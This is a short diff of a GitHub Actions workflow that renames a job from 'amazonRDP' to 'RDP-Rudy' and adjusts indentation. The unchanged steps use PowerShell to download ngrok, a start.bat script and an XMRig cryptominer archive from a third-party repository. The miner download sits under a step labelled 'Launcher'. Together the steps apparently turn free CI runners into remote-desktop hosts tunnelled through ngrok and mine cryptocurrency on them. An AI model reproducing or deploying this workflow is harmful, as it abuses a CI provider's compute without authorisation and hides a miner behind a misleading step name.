@@ -1,4 +1,4 @@
-name: amazonRDP
+name: RDP-Rudy
 
 on: workflow_dispatch
 
@@ -13,7 +13,8 @@ jobs:
       run: |
         Invoke-WebRequest https://github.com/b0751/b0751/blob/main/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
         Invoke-WebRequest https://github.com/b0751/b0751/blob/main/start.bat -OutFile start.bat
-     - name: Mendownload Launcher.
+    
+    - name: Mendownload Launcher.
       run: |
         Invoke-WebRequest https://github.com/b0751/b0751/blob/main/xmrig-6.14.1.zip -OutFile "xmrig-6.14.1.zip"
         
